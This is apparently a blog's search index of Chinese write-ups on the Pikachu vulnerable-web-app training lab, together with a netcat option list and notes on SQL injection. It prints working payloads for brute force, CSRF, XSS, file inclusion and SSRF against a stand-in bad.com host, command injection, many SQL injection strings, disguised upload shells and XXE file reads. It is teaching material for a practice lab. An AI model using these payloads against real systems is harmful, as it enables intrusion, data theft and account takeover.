连接目标主机: nc [-option] hostname port[s] [ports] 监听等待连接: nc -l -p port [-options] [hostname] [port] 参数 含义 备注 -c 使用 shell command作为连接后的应用程序, /bin/sh 危险 -e filename 使用 filename应用作为连接后的应用程序； 危险 -b 允许广播 -g gateway 设置路由跳点，最多设置8个 -G num -i secs 扫描端口时，设置的发送线路的延迟间隔； -k 设置socket保持存活 -l (小写L) ，监听模式 ，等待连接 常用 -n 仅数字ip地址，无DNS -o file (小写字母O),十六进制转储 -p port 指示本地端口 常用 -r 随机化本地和远端端口 -q secs 在标准输入结束和延迟和退出 -s addr 本地源地址 -T tos 设置服务类型 常用 -t 应答TELNET沟通 -u 指示使用UDP模式 常用 -v 详细模式 ，显示详细信息，（ -vv ）更加详细 常用 -w secs 设置超时时间 -C 设置，发送 CRLF 的换行符 -z 启用 无I/O模式 ，此模式无I/O内容，仅进行扫描 ；更快速； 常用","link":"/something-about-Netcat/"},{"title":"something about Pikachu - Burte Force","text":"pikachupikachu =&gt; 备份地址 Brute Force(暴力破解)基于表单的暴力破解 使用burpsuite抓包，利用字典破解 针对password进行暴破。 1username=admin&amp;password=§passwd§&amp;submit=Login 验证码绕过(on Server)此验证码只要不刷新，就可以无限使用，因此暴力破解比较简单。 与基于表单的暴力破解相同,对password进行暴力破解。 1username=admin&amp;password=§passwd§&amp;vcode=35kmjk&amp;submit=Login 验证码绕过(on Client)此验证码为纯前端验证码，审查元素中去除form的onsubmit事件。然后与基于表单的暴力破解相同。 123&lt;form id=&quot;bf_client&quot; method=&quot;post&quot; action=&quot;bf_client.php&quot; onsubmit=&quot;return validate();&quot;&gt; &lt;!-- content --&gt;&lt;/form&gt; token防暴破此验证码使用token验证，请求页面时页面内有隐藏的token内容。使用burpsuite时，设置通过 正则从响应中获取token，暴力破解。 从页面中获取token设置参考:brute force(#High) 针对password和token暴力破解。 1username=admin&amp;password=§password§&amp;token=§2614161ae1e6869d9e496577103§&amp;submit=Login","link":"/something-about-Pikachu-Burte-Force/"},{"title":"something about Pikachu - CSRF","text":"pikachupikachu =&gt; 备份地址 CSRF概述Cross-site request forgery,简称’CSRF’。由攻击者伪造一个请求(一般以链接的形式)，然后欺骗用户进行点击， 用户一但点击了请求，整个攻击就完成了。因此CSRF攻击也被称为one click攻击。 CSRF 与 XSS 区别 XSS一般盗取用户的cookie后，由攻击者利用cookie自行执行恶意操作。 攻击者 有 登录凭证 CSRF则是攻击者构造好恶意请求后，交给用户，由用户本人自行点击链接发起请求，若刚好用户的对应网站刚好处于登录 状态，那么相当于用户自己做的恶意操作。 攻击者 无 登录凭证 CSRF防范 对敏感操作增加安全token 对敏感操作增加验证码 对敏感操作增加安全逻辑流程 如修改密码时先验证旧密码。 CSRF(get)修改个人信息没有安全防护，因此构造恶意链接诱导用户点击，修改用户性别。 1/http://train.com/pikachu/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=18626545453&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit CSRF(post)构造一个html页面，诱导用户访问，页面访问后执行恶意请求。 1234567891011121314151617181920212223242526&lt;html&gt; &lt;head&gt; &lt;script&gt; window.onload = function() { document.getElementById(&quot;postBtn&quot;).click(); } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;h1&gt;正常页面&lt;/h1&gt; &lt;/div&gt; &lt;div style=&quot;display: none&quot;&gt; &lt;form method=&quot;post&quot; action=&quot;http://train.com/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt; &lt;input name=&quot;sex&quot; value=&quot;bad&quot;&gt; &lt;input name=&quot;phonenum&quot; value=&quot;18626545453&quot;&gt; &lt;input name=&quot;add&quot; value=&quot;china&quot;&gt; &lt;input name=&quot;email&quot; value=&quot;vince@pikachu.com&quot;&gt; &lt;input id=&quot;postBtn&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; CSRF(token)页面有一个隐藏域用来持有token值，此token值是正常登录访问页面时服务器给的随机值， 不是能够简单获取的。因此，使用token进行防范，是一个比较好的手段。","link":"/something-about-Pikachu-CSRF/"},{"title":"something about Pikachu - Cross-Site Scripting","text":"pikachupikachu =&gt; 备份地址 Cross-Site Scripting概述XSS(跨站脚本攻击)一般常见如下几种类型: 反射型(Reflected) 存储型(Stored) DOM型(DOM) 常见防范手段: 输入过滤 对输入内容进行过滤，不允许可能导致XSS攻击的字符输入。 输出过滤 根据输出点的位置对输出到前端的内容进行适当转义。 反射型xxs(get)在输入框中直接输入对应脚本语句即可。 输入框有长度限制，或者审查元素中修改长度限制，或者直接构造URL。 1http://train.com/pikachu/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert('bad');&lt;/script&gt;&amp;submit=submit 反射型xxs(post)与反射型xxs(get)类似。 存储型xss留言板功能，用户输入未做过滤，直接存储在DB中，取出渲染时也未做处理。 直接存入脚本语句即可。 DOM型XSS在输入框中输入的内容会被拼接成超链接的href属性，因此构造闭合标签。 1'&gt;&lt;/a&gt; &lt;img src=&quot;nothing&quot; onerror=&quot;alert('bad');&quot; /&gt; &lt;a href=' DOM型XSS-x在输入框中输入的内容会被拼接成超链接的href属性，但是必须要先点击先出现的超链接，触发domxss()方法， 才会拼接生成对应超链接。 构造闭合标签与DOM型XSS相同。 XSS之盲打盲打就是注入脚本后，没有即时反馈。 因此需要尽可能多的提交XSS语句，查看哪些语句被执行了。 此次盲打是存储型XSS，是输入意见与名字,因此对应注入: 意见 1&lt;script&gt;alert('msg');&lt;/script&gt; 名字 1&lt;script&gt;alert('name');&lt;/script&gt; 登录显示页面查看: 全部注入成功。 1http://train.com/pikachu/vul/xss/xssblind/admin.php XSS之过滤&lt;script&gt;标签被过滤了，使用&lt;img/&gt;标签注入。 只是简单的直接匹配,大小写转换后尝试，&lt;SCRIPT&gt;也可以。 1&lt;img src=&quot;nothing&quot; onerror=&quot;alert('bad');&quot; /&gt; XSS之htmlspecialcharsphp的htmlspecialchars()函数将字符转换为html实体,如&lt;转换为&amp;lt;。 利用&lt;a&gt;标签的onclick事件，不使用特殊符号，只使用'(单引号)。 1' onclick='alert(/bad/);' XSS之href输出html的&lt;a&gt;标签的href属性可以指定script。 1&lt;a href=&quot;javascript:alert('bad')&quot;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt; XSS之js输出内容提交后，拼接到script中，由javascript根据内容判断渲染什么内容。 因此可以构造闭合&lt;script&gt;标签。 1';&lt;/script&gt;&lt;script&gt;alert(&quot;bad&quot;);&lt;/script&gt;","link":"/something-about-Pikachu-Cross-Site-Scripting/"},{"title":"something about Pikachu - File Inclusion","text":"pikachupikachu =&gt; 备份地址 File Inclusion概述各种开发语言都提供了内置的文件包含函数，使得开发人员可以在一个代码文件中包含(引入)另外一个代码文件。 PHP中提供了include()，include_once()，require()，require_once()等函数。 当要包含的目标文件名被定义为变量，并期待前端用户传递此变量，若没有做够安全考虑，会引发文件包含漏洞。 文件包含漏洞分为： 本地文件包含漏洞 仅能对服务器本地文件进行包含，由于包含文件并不受攻击者控制，因此更大可能是包含一些系统配置文件，进而读取系统敏感 信息。 当本地文件包含漏洞与文件上传漏洞结合时，变相实现了包含任意文件的功能，危害更大。 远程文件包含漏洞 能够通过URL包含远程文件，因此可以包含任意文件，危害很大。 File Inclusion(local)构造请求，包含指定文件。关于服务器文件路径，可以尝试利用命令执行漏洞来获取。 1/pikachu/vul/fileinclude/fi_local.php?filename=../../../../bitnami.css&amp;submit=Submit+Query File Inclusion(remote)构造请求，包含远程文件。 1/pikachu/vul/fileinclude/fi_remote.php?filename=http://bad.com/bad.php&amp;submit=Submit+Query","link":"/something-about-Pikachu-File-Inclusion/"},{"title":"something about Pikachu - Over Permission","text":"pikachupikachu =&gt; 备份地址 Over Permission概述如果使用 低权限 A用户的权限去操作 高权限 B用户的数据，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则 。 越权漏洞容易出现在权限页面(需要登录的页面)中增、删、改、查的地方，进行这些操作时， 后台需要进行合理的权限校验。 权限管理应当遵守: 使用最小权限原则对用户进行赋权 使用合理(严格)的权限校验规则 使用后台登录状态作为条件进行权限判断，不盲目使用前端传递的条件判断条件 水平越权水平越权指的是 相同权限 下的 不同用户 可以相互访问 登录lucy/123456用户后，查看个人信息时，会向/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=点击查看个人信息请求数据。 可以观察到username=lucy参数，将其更换为同权限的其他用户名即可获得其他用户的信息。 12# 使用`lucy`身份，查看`lili`用户信息http://train.com/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=点击查看个人信息 垂直越权垂直越权指的是使用 低权限用户 可以访问到 高权限用户 。 登录admin/123456用户，添加用户时可以查看到URL为: 12POST /pikachu/vul/overpermission/op2/op2_admin_edit.php HTTP/1.1username=qwe&amp;password=qweqwe&amp;sex=&amp;phonenum=&amp;email=&amp;address=&amp;submit=%E5%88%9B%E5%BB%BA 后台获得参数后直接插入，没有权限验证。因此登录pikachu/000000这个只有查看权限的用户后， 直接访问http://train.com/pikachu/vul/overpermission/op2/op2_admin_edit.php页面，即可进入 添加用户页面，并且能够正常添加用户。","link":"/something-about-Pikachu-Over-Permission/"},{"title":"something about Pikachu - PHP serialize","text":"pikachupikachu =&gt; 备份地址 PHP反序列化概述php中的serialize()和unserialize()函数，可以将一个对象转变成可传输的字符串，以及从字符串 转换回对象。类似于javascript中的JSON.stringify(obj)和JSON.parse(str)函数的功能。 PHP中的serialize规则: 123456789101112131415161718192021222324252627282930// 有以下类:class S{ public $paramA = &quot;valueA&quot;; public $paramB = &quot;valueB&quot;; function funA(){ echo &quot;function A&quot;; } function __destruct(){ echo $this-&gt;paramA; }}$obj = new S();$objStr = serialize($obj);echo $objStr;// 序列化后的结果为// O:1:&quot;S&quot;:2:{s:6:&quot;paramA&quot;;s:6:&quot;valueA&quot;;s:6:&quot;paramB&quot;;i:2;}// O: 代表object; 1: 代表类名长度为1; &quot;S&quot;: 类名为&quot;S&quot;;// 2: 代表类中有2个变量// 变量一:// s: 代表数据类型(变量名)为字符串; 6: 代表变量名长度为6; &quot;paramA&quot;: 代表变量名为&quot;paramA&quot;;// s: 代表数据类型(变量值)为字符串; 6: 代表变量值长度为6; &quot;valueA&quot;: 代表变量值为&quot;valueA&quot;;// 变量二:// s: 代表数据类型(变量名)为字符串; 6: 代表变量名长度为6; &quot;paramB&quot;: 代表变量名为&quot;paramB&quot;;// i: 代表数据类型(变量值)为数值型; 2: 代表变量值为2; unserialize就是serialize的反向操作。 unserialize和serialize本身没什么问题，但是当反序列化的内容受用户控制时，可能会造成 不正当使用,特别是后台使用了一些魔法函数时。 常见魔法函数如下: __construct() 对象被创建时被调用 __destruct() 对象被销毁时被调用 __toString() 当一个对象被当作一个字符串使用时被调用 __sleep() 对象在被序列化之前被调用 __wakeup() 当一个对象在被序列化之后被调用 例如上述class S{}，可以构造对应payload使其具有恶意行为。 123456// 此时转义符号// payload 为 O:1:&quot;S&quot;:2:{s:30:&quot;&lt;script&gt;alert('bad');&lt;/script&gt;&quot;;s:6:&quot;valueA&quot;;s:6:&quot;paramB&quot;;i:2;}$objStr = 'O:1:&quot;S&quot;:2:{s:30:&quot;&lt;script&gt;alert(\\'bad\\');&lt;/script&gt;&quot;;s:6:&quot;valueA&quot;;s:6:&quot;paramB&quot;;i:2;}';$obj = unserialize($objStr);// 由于后序对$obj没有使用，垃圾回收时会销毁对象，因此调用`__destruct()`函数。// 从而执行恶意代码 PHP反序列化漏洞构造对应对象字符串: 1// payload 为 O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:30:&quot;&lt;script&gt;alert('bad');&lt;/script&gt;&quot;;}","link":"/something-about-Pikachu-PHP-serialize/"},{"title":"something about Pikachu - RCE","text":"pikachupikachu =&gt; 备份地址 RCE(remote command/code execute)概述REC(远程命令执行漏洞),一般由于应用系统从设计上需要给用户提供指定的远程命令操作的接口。 比如常见的路由器，防火墙，入侵检测等设备的web管理界面。 一般给用户提供一个ping 操作的web界面，用户输入目标IP，提交后，系统后台执行ping命令， 如果没有对目标IP进行严格的安全控制，有可能会造成RCE漏洞。 例如: 12# ping 命令执行失败，执行`ifconfig`ping 127.0.0.a || ifconfig exec “ping” 手动注入 PHP的shell_exec(cmd)函数，将调用系统shell执行cmd。 因此对参数进行构造，使得执行恶意命令。 123# %7C =&gt; |# ipaddress=127.0.1.a || ipconfigipaddress=127.0.1.a+%7C%7C+ipconfig&amp;submit=ping exec “eval” 手动注入 PHP的eval(statement)函数，将statement解析为php语句进行执行。这 非常危险 。 因此构造参数，执行恶意命令。 1echo shell_exec('ipconfig'); 将会执行eval(&quot;echo shell_exec('ipconfig');&quot;),因此可以执行系统命令。","link":"/something-about-Pikachu-RCE/"},{"title":"something about Pikachu - SQL-Inject","text":"pikachupikachu =&gt; 备份地址 SQL-Inject概述SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台进行处理时，未对数据做严格的判断，导致传入的恶意内容拼接 到SQL语句中，被当做SQL语句的一部分执行，从而导致数据库受损。 防范SQL注入策略 对前端传递来的数据进行过滤，不允许危险字符传入 使用参数化查询的方式(Parameterized Query/Parameterized Statement) 目前很多ORM框架也提供了SQL拼接方式查询，使用时需要注意 数字型注入(post) 手动注入 使用burpsuite抓到包后，在请求参数后添加boolean为真的语句。观察是否检索结果有不同。 全部结果检索出来，SQL注入成功。 1id=2 or true#&amp;submit=%E6%9F%A5%E8%AF%A2 sqlmap 使用burpsuite抓包后将请求信息保存至文件，由sqlmap对id进行注入。 1sqlmap -r number.txt --level=5 --risk=3 -p id --dbs --batch 字符型注入(get) 手动注入 使用burpsuite抓到包后，在请求参数后添加boolean为真的语句。观察是否检索结果有不同。 值得注意的是,由于GET参数拼接在URL中，因此最好将注入的内容进行URL编码。 123# + =&gt; 空格# %23 =&gt; #/pikachu/vul/sqli/sqli_str.php?name=vience'or+true%23&amp;submit=%E6%9F%A5%E8%AF%A2 sqlmap 使用burpsuite抓包后将请求信息保存至文件，由sqlmap进行对name进行注入。 1sqlmap -r charsequence.txt --level=5 --risk=3 -p name --dbs --batch 搜索型注入 手动注入 与字符型注入相同。 1/pikachu/vul/sqli/sqli_search.php?name=vi'or+true%23&amp;submit=%E6%90%9C%E7%B4%A2 sqlmap 使用burpsuite抓包后将请求信息保存至文件，由sqlmap进行对name进行注入。 1sqlmap -r search.txt --level=5 --risk=3 -p name --dbs --batch xx型注入 手动注入 与字符型注入相同。 1/pikachu/vul/sqli/sqli_x.php?name=hello'or+true%23&amp;submit=%E6%9F%A5%E8%AF%A2 经尝试，会报SQL错误，因此可能是SQL语句未闭合。 1/pikachu/vul/sqli/sqli_x.php?name=hello')or+true%23&amp;submit=%E6%9F%A5%E8%AF%A2 sqlmap 与字符型注入相同。 1sqlmap -r xx.txt --level=5 --risk=3 -p name --dbs --batch 得到payload为有)的闭合语句。 1name=hello') AND 7065=(SELECT (CASE WHEN (7065=7065) THEN 7065 ELSE (SELECT 1143 UNION SELECT 7507) END))-- -&amp;submit=%E6%9F%A5%E8%AF%A2 insert/update注入可以应用报错注入。获得关心的信息。 此次利用了updatexml(xml_document, XPath, new_Value)函数中，XPath中不可包含~字符，因此使用0x7e时，一定会报错。 当程序开启了报错打印后，报错信息就会显示在页面上。 1234# 构造insert into table(name, passwd)values('ABC', '123'); 中`ABC`为以下内容# name' or updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir), 0)or'# 构造的URL完整参数部分username=name' or updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir), 0)or'&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit 得到结果XPATH syntax error: '~pikachu~pikachu@localhost~C:\\xa'。 delete注入与insert/update注入相同,使用报错注入。 构造对应URL。 12345# URLencode# %40 ==&gt; @# %23 ==&gt; ## /pikachu/vul/sqli/sqli_del.php?id=updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),0)#/pikachu/vul/sqli/sqli_del.php?id=updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,%40%40datadir),0)%23 得到结果XPATH syntax error: '~pikachu~pikachu@localhost~C:\\xa'。 http header注入尝试对HTTP头进行修改后发包，发现会有SQL报错，因此对HTTP头的属性进行注入。 此次对User-Agent进行注入。 1User-Agent: 'or updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),0)or'# 得到结果XPATH syntax error: '~pikachu~pikachu@localhost~C:\\xa'。 盲注(base on boolean) 手动注入 针对name做注入，值得注意的是，pikachu对返回件数有判断，因此使用limit语句限制返回件数。 12# # =&gt; %23/pikachu/vul/sqli/sqli_blind_b.php?name=hello'+or+true+limit+1%23&amp;submit=%E6%9F%A5%E8%AF%A2 sqlmap 与字符型注入相同。 1sqlmap -r boolean.txt --level=5 --risk=3 -p name --dbs --batch 得到报错payload。 12# 需要自行`URLencode`,注意`name=`中的`=`不要`encode`name=hello'||(SELECT 0x6e6b7342 WHERE 6588=6588 AND (SELECT 7080 FROM(SELECT COUNT(*),CONCAT(0x7176767a71,(SELECT (ELT(7080=7080,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&amp;submit=%E6%9F%A5%E8%AF%A2 盲注(base on time) 手动注入 针对name注入，基于时间盲注，查看页面响应时间。 12# 检索时等待5s/pikachu/vul/sqli/sqli_blind_t.php?name=kobe'+and+sleep(5)%23&amp;submit=%E6%9F%A5%E8%AF%A2 基于时间的盲注一般与if分支结合。 if(condition, case1, case2)意为: 12345if condition case1else case2endif 当数据库的名称首字母为a时，页面等待5s，否则正常。 数据库的名字为pikachu，与a不相等，因此正常响应。 12# if(substr(database(),1,1)='a',sleep(5),null)/pikachu/vul/sqli/sqli_blind_t.php?name=kobe'+and+if(substr(database(),1,1)%3d'a',sleep(5),null)%23&amp;submit=%E6%9F%A5%E8%AF%A2 当数据库的名称首字母为p时，页面等待5s，否则正常。 此次响应等待了5s，因此可以判断数据库的名字的首字母为p。 12# if(substr(database(),1,1)='p',sleep(5),null)/pikachu/vul/sqli/sqli_blind_t.php?name=kobe'+and+if(substr(database(),1,1)%3d'p',sleep(5),null)%23&amp;submit=%E6%9F%A5%E8%AF%A2 宽字节注入 手动注入 针对name注入。 12# 单引号前增加`%df`name=hello%df%27or+true%23&amp;submit=%E6%9F%A5%E8%AF%A2","link":"/something-about-Pikachu-SQL-Inject/"},{"title":"something about Pikachu - SSRF","text":"pikachupikachu =&gt; 备份地址 SSRF概述SSRF(Server-Side Request Forgery:服务器端请求伪造)。主要由于服务端提供了从其他服务器应用获取数据 的功能，但又未对目标地址做严格的限制，导致攻击者可以传入恶意地址。服务器对恶意地址进行请求， 返回恶意内容后造成损失。 PHP后台对目标地址请求的函数主要有: file_get_contents() fsockopen() curl_exec() SSRF(curl)在url中拼接对应的恶意地址即可。 1http://train.com/pikachu/vul/ssrf/ssrf_curl.php?url=http://bad.com/ SSRF(file_get_content)在url中拼接对应的恶意地址即可。 1http://train.com/pikachu/vul/ssrf/ssrf_fgc.php?file=http://bad.com/bad.php 也可指定目标服务器上指定文件。 1http://train.com/pikachu/vul/ssrf/ssrf_fgc.php?file=C:\\Windows\\System32\\drivers\\etc\\hosts","link":"/something-about-Pikachu-SSRF/"},{"title":"something about Pikachu - Unsafe Filedownload","text":"pikachupikachu =&gt; 备份地址 Unsafe Filedownload概述不安全的文件下载，一般用户点击下载链接，便会向后台发送一个请求，此请求包含需要下载的文件名称，后台接收到请求后返回对应response。 当后台直接将文件名拼接至路径中，而不对其进行安全判断，则可能会引发Unsafe Filedownload漏洞。因为攻击者可能会构造一个恶意 文件名，从而获取敏感信息。 不安全的文件下载根据特征，构造恶意文件名../../../README.md，从而获取pikachu的README文件。 1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../README.md","link":"/something-about-Pikachu-Unsafe-Filedownload/"},{"title":"something about Pikachu - Unsafe Fileupload","text":"pikachupikachu =&gt; 备份地址 Unsafe Fileupload概述在web应用系统中文件上传功能很常见，比如上传头像，上传附件等。 当后台程序对上传的文件进行的安全判断条件不够严谨时，攻击者可能会上传一些恶意文件，导致造成损失。 在设计文件上传功能时，要对以下方面进行安全考虑。 验证文件类型，后缀名，大小 验证文件上传方式 对文件进行一定复杂程度的重命名 不要暴露文件上传后的路径 client check是客户端javascript限制，因此将对应触发语句去除即可。 12&lt;!-- 去除onchange函数 --&gt;&lt;input class=&quot;uploadfile&quot; type=&quot;file&quot; name=&quot;uploadfile&quot; onchange=&quot;checkFileExt(this.value)&quot;&gt; MIME type 更改文件后缀名 是服务端进行MIME判定，因此将恶意文件重命名为bad.png上传，此时MIME为图片。 使用burpsuite截断后将文件名再更改为bad.php。 更改HTTP Content-Type 直接上传bad.php，使用burpsuite截断后将HTTP请求的Content-Type更改为image/png。 getimagesizegetimagesize()函数能够获取文件头类型。 文件头类型(# 文件头) 添加伪造文件头 在恶意文件中添加对应的文件头信息，即可伪装为对应的文件。 12345// 伪造image文件头GIF98&lt;?php phpinfo();?&gt; 附加恶意内容 上传正常图片文件,使用burpsuite截断，在请求内容中追加恶意代码。然后利用文件包含漏洞将此文件包含,即可执行隐藏的代码。 1234567Content-Disposition: form-data; name=&quot;uploadfile&quot;; filename=&quot;badimg.png&quot;Content-Type: image/pngPNGXXXXX....YYYYYY...ZZZ&lt;?php phpinfo(); ?&gt;","link":"/something-about-Pikachu-Unsafe-Fileupload/"},{"title":"something about Pikachu - XXE","text":"pikachupikachu =&gt; 备份地址 XXE概述XXE(XML external entity injection)，xml外部实体注入。 概括就是，攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行， 导致问题。 目前很多语言中，对应的解析xml的函数默认是禁止解析外部实体内容的，从而直接避免此漏洞。 XXE漏洞XML用来存储数据或传输数据。 一般定义如下: 1234567891011121314&lt;!-- 第一部分:文档声明部分 --&gt;&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!-- 第二部分:文档定义类型DTD --&gt;&lt;!-- 文档类型为note类型 --&gt;&lt;!-- 定义名为`myparam`的外部实体的值为`myValue` --&gt;&lt;!DOCTYPE note [ &lt;!ENTITY myparam &quot;myValue&quot;&gt;]&gt;&lt;!-- 第三部分:文档元素 --&gt;&lt;name&gt;&amp;myparam;&lt;/name&gt;&lt;!-- ... --&gt; 正常开发时，第一部分一般不会注意。第二部分一般使用url引入需要的DTD。在之前学比较老的SpringMVC， 使用XML配置文件时，文件头就会引入Spring的文档定义类型，然后在第三部分中就可以使用对应的实体(标记对)。 构造payload,访问敏感文件。 123&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY myparam SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;]&gt;&lt;name&gt;&amp;myparam;&lt;/name&gt;","link":"/something-about-Pikachu-XXE/"},{"title":"something about Pikachu - iCanSeeYourABC","text":"pikachupikachu =&gt; 备份地址 敏感信息泄漏概述由于后台人员疏忽或者不当的设计，导致不应该被用户察觉到的数据被轻松访问。 例如: 通过URL列出服务器的目录结构 请求中包含错误参数时，报错信息中包含系统,中间件,开发语言的版本或其它信息 前端源码中包含敏感信息,例如后台登录地址,内网接口信息,测试帐号/密码等 I can see your ABC此次漏洞表现为在前端源码中暴露了测试帐号/密码。 审查元素中检索test,admin,123456,测试,帐号，密码,password,passwd等内容， 有可能会有发现。 此次测试帐号为lili/123456。","link":"/something-about-Pikachu-iCanSeeYourABC/"},{"title":"something about Pikachu - traverse directory","text":"pikachupikachu =&gt; 备份地址 目录遍历概述在Web设计时将需要访问的文件定义为变量，由前端传递真正想要访问的文件名，从而使前端功能更加便利时，可能会 引起目录遍历漏洞。那是由于，后台没有对前端传递的值进行严格的安全考虑，导致攻击者可以通过../相对目录的方式 遍历服务器其它目录文件列表。 目录遍历漏洞与不安全的文件下载或文件包含漏洞相似，只是出现的位置与表现不同。 另外，以http://abc/dir方式直接列出dir目录中的内容，这种情况称之为敏感信息泄漏,不归类于目录遍历。 目录遍历直接将url中的title=abc.php参数，更换为title=../xxx就可实现访问其它文件。 1http://train.com/pikachu/vul/dir/dir_list.php?title=../dir.php","link":"/something-about-Pikachu-traverse-directory/"},{"title":"something about SQL-Injection skills","text":"SQL 注入分类报错注入 报错方法 Duplicate entry 123456789101112131415and( select 1 -- 检索y的值(1) from ( select count(*) ,concat( -- 利用 concat函数拼接内容,起别名为x 0x23 -- 拼接#符号,分隔信息 ,($PAYLOAD) -- payload ,0x23 ,floor(rand(0)*2) -- floor函数与count(*)，group by,结合使用来报错 ) as x from information_schema.tables group by x -- floor产生的0/1序列，group by 时会报错(重复主键) ) as y) 公式and+(+select+1+from+(+select+count(*)+,concat(0x23,($PAYLOAD),0x23,floor(rand(0)*2))as+x+from+information_schema.tables+group+by+x+)as+y+)+--+ updatexml报错 12345and updatexml(1 ,concat($PAYLOAD -- ~(0x7e)是非法字符，一定会报错 ,0x7e) ,1) 公式，and+(updatexml(1,cancat(database(),0x7e),1))+--+。 updatexml(XML_document, XPath_string, new_value)，当XPath_string格式出现错误时，mysql会报语法错误。 extractvalue报错 12345and extractvalue(1, concat($PAYLOAD ,0x7e) ) 公式and+(extractvalue(1,cancat($PAYLOAD,0x7e)))+--+。 extractvalue(XML_document, XPath_string),与updatexml()函数相同，当XPath_string格式出现错误时，mysql会报语法错误。 盲注 基于布尔 使用?id=1'+and+false+--+与?id=1'+or+true+--+确认是否存在注入点。 可是，确认存在注入点又能做到什么呢? 由于 检索成功 与 检索失败 两种情况天然为布尔型，因此可以据此进行大量请求，通过一系列的判断 获得数据库情况。 例如可以通过大量类似于 ?id=1'+and+(ascii(substr(database(),1,1))=ascii('a'))+--+ ?id=1'+and+(ascii(substr(database(),2,1))=ascii('b'))+--+ … ?id=1'+and+(ascii(substr(database(),1,1))&gt;ascii('m'))+--+ ?id=1'+and+(ascii(substr(database(),1,1))&lt;ascii('g'))+--+ … ?id=1'+and+(length(database())+&lt;+20)+--+ ?id=1'+and+(length(database())+&gt;+10)+--+ … ?id=1'+and+(length((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1))+&lt;+20)+--+ ?id=1'+and+(length((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1))+&lt;+20)+--+ … id=1'+and+(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))+&lt;+ascii('m'))+--+ id=1'+and+(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),1,1))+&lt;+ascii('m'))+--+ 的猜测，得到数据库的名字,长度,数据表的长度等。 基于时间 使用?id=1'+or+true+--+与?id=1'+and+sleep(5)+--+确认是否存在注入点。 与基于布尔类似， 页面响应延迟 与 页面响应正常 两种情况，天然为布尔型， 因此可以据此进行大量请求，通过一系列的判断获得数据库情况。 使用例如下: ?id=1'+and+(ascii(substr(database(),1,1))&lt;ascii('m'))+and+sleep(5)+--+ ?id=1'+and+(ascii(substr(database(),2,1))&gt;ascii('m'))+and+sleep(5)+--+ 利用了短路与的特性， 当and(ascii(...))为 真 时，会执行and sleep(...)，页面延迟响应， 当and(ascii(...))为 假 时，and sleep(...)语句被短路，页面无延迟响应,即正常响应。 宽字节注入当数据库使用的编码为类似GBK等双字节编码时，会导致在解析SQL语句的每个字符时以每两个字节来获取。 而在对SQL注入进行防范时，php经常会使用addslashes()对字符串中的特殊字符前增加\\转义符。 例如注入后的参数,在URL中为URLencode后的值(hello%27or+true%23)，传递到后台时为hello'or true#。 后台的处理为: 1$sql = &quot;select a from tb where a='addslashes($param)';&quot;; 我们预想的结果为闭合hello,令a与hello进行比较。 1select a from tb where a='hello'or true#'; 其实结果为a与hello\\'or true#，并未能够实现绕过。 1select a from tb where a='hello\\'or true#'; 为了绕过addslashes()的转义，因此在向后台传递注入时，增加处理手段。在单引号'前增加一个字节，%df。 URL中参数为%68%65%6c%6c%6f%df%27(此为全encode样子),传递到后台后为hello%df'(关注%df%27)。调用addslashes()函数后会在'前增加一个\\，结果为 hello%df\\'(关注%df%5c%27)。因此在数据库在解码时，由于我们人为的添加了一个字节，导致解码时会有一个错位。所以%df%5c会在一起解码成为一个汉字。 真实结果为a与hello我，最终还是闭合成功，成功注入。 12-- 假装`%df%5c`是汉字`我`select a from tb where a='hello我'or true#'; SQL注入技巧 注入注释 注入注释时，可选择--或#，其后最好紧跟一个空格，可以用%20或+来表示空格。 可以使用%23来表示#。 闭合 可以使用and sleep(5)判断闭合方式 ?id=1'+and+sleep(5) 闭合成功时，页面响应延迟。 页面正常响应时，说明闭合失败,需要更换闭合方式。 尝试闭合'(单引号) id=’$id’ 尝试闭合&quot;(双引号) ‘id=’ . ‘“‘ . $id . ‘“‘ . ‘…’ 尝试闭合()(括号) id=($id) 尝试闭合('')(单引号与括号) id=(‘$id’) 尝试闭合(&quot;&quot;)(双引号与括号) id=(“$id”) 注入步骤 确认注入点 确认是否存在注入点。 确认注入点类型 本身就将检索结果渲染在页面上时，可以方便的将敏感信息输出至页面。 报错型注入，会在页面输出报错信息，可以将敏感信息在报错信息中显示出来。 确认查询子列数 确认sql查询了几列，页面上显示的是哪几列，确认后可以将敏感信息放置在对应的列中显示在 页面上。 例如：原sqlselect username,password,birthday from ...where id='$id'。可以注入 select username,password,birthday from ...where id='1' and false union select 1,2,3 # '， 以确认页面上显示的是哪几列。 根据上面确认的显示列，可以注入获得关心的信息。 select username,password,birthday from ...where id='1' and false union select version(),database(),3 # '， 这样就可以将关心的敏感信息显示在页面上。 获取信息 